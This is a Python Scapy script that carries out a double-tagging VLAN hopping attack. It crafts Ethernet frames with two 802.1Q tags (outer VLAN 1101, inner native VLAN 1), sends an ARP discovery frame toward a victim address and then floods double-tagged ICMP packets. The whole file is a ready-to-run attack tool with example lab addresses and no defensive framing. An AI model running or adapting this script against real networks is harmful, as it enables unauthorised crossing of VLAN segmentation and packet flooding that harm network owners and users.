from scapy.all import *
import time

class DoubleTaggingAttack:
    def __init__(self):
        """
        Initialize Double Tagging VLAN Hopping Attack
        """
        self.interface = 'eth0'  # Replace with your network interface
        
        # Network configuration
        self.victim1_ip = '192.168.1.5'
        self.victim2_ip = '192.168.1.6'
        self.attacker_ip = '192.168.2.5'
        
        # VLAN configuration
        self.victim_vlan = 1101
        self.target_vlan = 1  # Native VLAN
        
        # Get local MAC address
        self.attacker_mac = get_if_hwaddr(self.interface)
        
    def generate_double_tagged_packet(self):
        """
        Create a double-tagged VLAN hopping packet
        """
        double_tagged_packet = (
            Ether(src=self.attacker_mac, 
                  dst="ff:ff:ff:ff:ff:ff")  # Broadcast
            /Dot1Q(vlan=self.victim_vlan)  # Outer VLAN tag
            /Dot1Q(vlan=self.target_vlan)  # Inner VLAN tag
            /IP(src=self.attacker_ip, 
                dst=self.victim1_ip)
            /ICMP()
        )
        
        return double_tagged_packet
    
    def flood_double_tagged_packets(self, 
                                    num_packets=100, 
                                    interval=0.1):
        """
        Flood network with double-tagged packets
        """
        print("[*] Initiating Double Tagging VLAN Hopping Attack")
        
        try:
            for i in range(num_packets):
                # Generate and send double-tagged packet
                packet = self.generate_double_tagged_packet()
                
                # Send packet
                sendp(packet, 
                      iface=self.interface, 
                      verbose=False)
                
                print(f"[+] Sent Double-Tagged Packet {i+1}")
                time.sleep(interval)
        
        except KeyboardInterrupt:
            print("\n[*] Double Tagging Attack Stopped")
        except Exception as e:
            print(f"[!] Attack Error: {e}")
    
    def perform_reconnaissance(self):
        """
        Perform basic network reconnaissance 
        using double-tagged packets
        """
        print("[*] Performing VLAN Hopping Reconnaissance")
        
        # ARP Discovery Packet
        arp_discovery = (
            Ether(src=self.attacker_mac, 
                  dst="ff:ff:ff:ff:ff:ff")
            /Dot1Q(vlan=self.victim_vlan)
            /Dot1Q(vlan=self.target_vlan)
            /ARP(pdst=self.victim1_ip)
        )
        
        # Send ARP request
        sendp(arp_discovery, 
              iface=self.interface, 
              verbose=False)
        
        print("[+] Sent ARP Discovery Packet")
    
    def launch_attack(self):
        """
        Comprehensive attack sequence
        """
        print("[*] Launching Double Tagging VLAN Hopping Attack")
        
        # Reconnaissance phase
        self.perform_reconnaissance()
        
        # Flooding phase
        self.flood_double_tagged_packets(
            num_packets=50,
            interval=0.2
        )

def main():
    attack = DoubleTaggingAttack()
    attack.launch_attack()

if __name__ == '__main__':
    main()
